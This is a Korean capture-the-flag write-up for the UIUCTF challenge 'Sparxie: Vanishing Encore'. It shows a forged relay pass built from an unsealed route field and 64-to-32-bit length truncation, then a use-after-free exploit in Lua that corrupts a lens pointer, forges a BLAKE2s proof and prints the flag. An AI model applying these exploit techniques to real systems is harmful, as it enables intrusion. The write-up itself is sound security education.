# Sparxie: Vanishing Encore

## 문제 설명

Sparxie is hosting one last stream before Planarcadia goes dark.

Her production moderation client accepts creator cartridges. One catalogue-approved Spotlight Pass is still circulating.

The service accepts one binary SPX2 cartridge on each connection, then closes the stream.

ncat --ssl sparxie-vanishing-encore.chal.uiuc.tf 1337

author: Mewski

## 풀이

### 분석

#### 1. 카트리지 형식

프로그램은 입력의 처음 32바이트를 헤더로 사용한다.

```c
#define CARTRIDGE_MAGIC "SPX2LIVE"
#define CARTRIDGE_HEADER_SIZE 32u

uint32_t plain_len = load32(buffer + 8);
```

헤더 뒤의 데이터는 간단한 XOR 스트림으로 복호화되고, 체크섬도 함께 검사된다. 다행히 `tools/pack.py`가 제공되므로 Lua 코드를 직접 암호화할 필요는 없었다.

```powershell
python tools\pack.py exploit.lua exploit.spx
```

#### 2. Spotlight Pass 구조

`spotlight.pass`는 다음 구조를 가진다.

```text
기본 헤더 16바이트 | route 16바이트 | body 28바이트 | seal 32바이트
```

기존 pass의 route는 archive 타입인 `0x11`이었다. archive route는 permit을 주지 않고 참만 반환한다. 실제 플래그를 얻으려면 relay 타입인 `0x27`로 통과해야 했다.

여기서 중요한 점은 seal 계산에 route가 포함되지 않는다는 것이다.

```c
blake2s_update(&hash, seal_domain, sizeof(seal_domain) - 1);
blake2s_update(&hash, header + 8, 8);
blake2s_update(&hash, body, body_len);
```

따라서 기존 pass의 header, body, seal은 그대로 두고 route만 relay 형식으로 바꿀 수 있다.

#### 3. `s8` 길이 필드의 64비트/32비트 불일치

relay 레코드는 Lua의 `string.unpack`으로 파싱된다.

```c
static const WireField relay_fields[] = {
    {WIRE_COUNTED, 8},
    {WIRE_UNSIGNED, 4},
    {WIRE_UNSIGNED, 4},
    {WIRE_UNSIGNED, 8}
};
```

생성되는 포맷은 대략 다음과 같다.

```lua
"<!1s8I4I4I8"
```

`s8`은 문자열 길이를 8바이트 정수로 읽는다. 하지만 WebAssembly 빌드는 32비트이므로 이후 C 코드의 `size_t`에는 하위 32비트만 남는다.

route의 `route[8:12]`를 `12`로 두면 문자열 길이는 12로 처리된다. 상위 32비트인 `route[12:16]`은 relay 해시가 요구하는 값으로 자유롭게 채워도 실제 문자열 길이 계산에서는 사라진다.

최종 relay route는 다음과 같이 만들었다.

```text
27 05 b9 89 3a fa b0 ed 0c 00 00 00 a2 05 85 c3
```

- `route[0] = 0x27`: relay 타입
- `route[1] = 0x05`: relay edition
- `route[8:12] = 12`: 하위 32비트 문자열 길이
- 나머지 검증 바이트: BLAKE2s relay digest에서 가져옴

이 과정은 브루트포스가 아니다. 입력이 모두 정해져 있으므로 BLAKE2s를 한 번 계산하면 route가 바로 나온다.

이렇게 만든 pass를 `sparxie.review(pass)`에 넣으면 유효한 permit userdata를 얻을 수 있었다.

#### 4. 숨겨진 Lua API 확인

`print`와 `tostring`은 막혀 있었지만, 실행 에러는 서버가 `[chat]`으로 출력해 주었다. 이를 이용해 `pairs`, `type`, `pcall`, `error`로 API를 조사했다.

확인한 주요 호출은 다음과 같다.

```lua
local studio = sparxie.studio()
local clip = studio:clip(offset, length)
clip:read(offset, length)
clip:write(offset, data)

local timeline = sparxie.timeline({clip})
studio:render(timeline, permit)

local draft = sparxie.draft()
local queue = sparxie.queue(draft)
local lens = queue:lens()
lens:receipt()
lens:read(offset, length)
lens:write(offset, data)
draft:publish()
```

소스에 `sparxie` 구현 파일이 완전히 들어 있지 않았기 때문에 `wabt`의 `wasm2wat`으로 WASM을 변환했다.

```powershell
wasm2wat sparxicle.wasm --generate-names -o sparxicle.wat
```

### 취약점

이 문제에서는 두 가지 문제를 연결해야 했다.

#### 취약점 1: relay pass의 타입 혼동

seal이 route를 보호하지 않고, `s8` 길이의 상위 32비트가 WebAssembly의 32비트 `size_t`로 변환될 때 사라진다. 이 차이를 이용하면 archive pass의 정상 body와 seal을 유지하면서 relay permit을 발급받을 수 있다.

#### 취약점 2: 중복 clip과 재사용된 studio slot

같은 범위를 가리키는 서로 다른 clip 두 개를 timeline에 넣으면 내부적으로 하나의 binding으로 합쳐진다. 하지만 render 과정은 대표 clip 하나만 새 studio slot로 갱신한다. 다른 clip은 예전 slot 주소를 캐시한 채 남는다.

다음과 같이 24번째 studio slot을 사용했다.

```lua
local filler = {}
for i = 1, 23 do filler[i] = sparxie.studio() end

local studio = sparxie.studio()
local live = studio:clip(0, 4096)
local stale = studio:clip(0, 4096)
stale:read(0, 1) -- 주소를 미리 캐시
local timeline = sparxie.timeline({live, stale})
```

그 후 23번째 filler를 GC로 해제하고 render를 호출했다.

```lua
filler[23] = nil
collectgarbage("collect")
studio:render(timeline, permit)
```

render는 live clip만 새 slot으로 옮긴다. 예전 slot은 해제되고, 곧이어 moderation queue가 같은 slot을 재사용한다. 그러나 `stale`은 여전히 예전 주소를 읽고 쓸 수 있다. 전형적인 UAF(Use-After-Free)와 비슷한 상황이다.

stale clip으로 queue의 lens 메타데이터 중 base pointer를 바꾸면 lens의 16KB 읽기·쓰기 범위를 정적 객체 풀로 향하게 할 수 있다.

```lua
stale:write(slot_offset + 16, string.pack("<I4", 128000))
local memory = lens:read(0, 16384)
```

이제 draft 구조체를 찾아 필요한 필드를 조작할 수 있다.

```lua
local magic_position = string.find(memory, "\242\166\216\049", 1, true)
local draft_offset = magic_position - 1 - 260

lens:write(draft_offset + 96, campaign)
lens:write(draft_offset + 104, "\193\037\078\183")
lens:write(draft_offset + 260, "\242\166\216\049")
```

마지막으로 `publish()`는 queue와 draft의 랜덤 데이터를 포함한 BLAKE2s proof를 검사한다. 랜덤값이 실행할 때마다 바뀌므로 proof를 미리 계산할 수는 없다. 대신 lens로 현재 메모리를 읽고 Lua 안에서 BLAKE2s를 구현해 계산했다.

검증 메시지는 다음 순서로 이어 붙인다.

```text
"SPARXIE::ENCORE::PROOF"
+ queue header 32바이트
+ draft[0:64]
+ allowed seal 32바이트
+ draft[96:104]
+ draft[104:108]
+ draft[108:112]
```

분석 중 특히 헷갈렸던 부분은 WAT의 다음 연산이었다.

```wat
local.get $l2
i32.const -64
i32.sub
```

처음에는 `l2 - 64`라고 생각했지만, 실제로는 `l2 - (-64)`, 즉 `l2 + 64`이다. 따라서 proof는 draft 기준 `+64` 위치에 써야 했다.

### 익스플로잇

전체 익스플로잇은 [exploit.lua](./sparxie-vanishing-encore/exploit.lua)에 저장했다. 코드의 핵심 흐름은 다음과 같다.

```lua
-- 1. 위조한 relay pass로 permit 발급
local permit = sparxie.review(pass)

-- 2. 중복 binding을 이용해 stale clip 생성
studio:render(timeline, permit)

-- 3. 해제된 studio slot을 queue가 재사용하게 함
local draft = sparxie.draft()
local queue = sparxie.queue(draft)
local lens = queue:lens()

-- 4. stale clip으로 lens의 base pointer 변조
stale:write(slot_offset + 16, string.pack("<I4", 128000))
local memory = lens:read(0, 16384)

-- 5. draft 상태와 BLAKE2s proof 조작
lens:write(draft_offset + 96, campaign)
lens:write(draft_offset + 104, "\193\037\078\183")
lens:write(draft_offset + 260, "\242\166\216\049")

local proof = blake2s(proof_message)
lens:write(draft_offset + 64, proof)
draft:publish()
```

카트리지를 생성하고 로컬에서 실행했다.

```powershell
python tools\pack.py exploit.lua exploit.spx
node sparxicle.js < exploit.spx
```

로컬 `/flag.txt`는 실제 서버 경로와 달라 마지막 JavaScript 함수에서 다음 에러가 발생했다.

```text
exiting due to exception: Error: backstage flag is unavailable
```

하지만 이 메시지는 그 직전의 모든 permit, queue, draft, proof 검사를 통과해 `sparxie_redeem()`까지 도달했다는 뜻이므로 익스플로잇 성공으로 판단할 수 있다.

서버에는 완성된 카트리지만 전송했다. Windows의 `ncat`이 표준입력 EOF 직후 종료하지 않도록 `--no-shutdown`을 사용했다.

```powershell
ncat --ssl --no-shutdown sparxie-vanishing-encore.chal.uiuc.tf 1337 < exploit.spx
```

서버 응답은 다음과 같았다.

```text

uiuctf{c0m3_w17h_5p4rx13_71ll_7h3_3nd_0f_7h3_w0rld}

```

## 배운 점

- WebAssembly가 32비트인지 64비트인지에 따라 C의 `size_t` 크기가 달라질 수 있다.
- 해시가 데이터 전체를 보호하는 것처럼 보여도, 실제로 어떤 필드가 해시 입력에서 빠졌는지 확인해야 한다.
- `print`가 막혀 있어도 `pcall`과 에러 메시지로 Lua API의 타입과 인자 형식을 조사할 수 있다.
- 같은 메모리 slot이 해제된 뒤 다른 객체로 재사용되면, 예전 포인터가 위험한 읽기·쓰기 primitive가 될 수 있다.
- 역어셈블 결과에서 `x - (-64)`와 `x - 64`는 완전히 다르므로 연산 순서를 조심해야 한다.
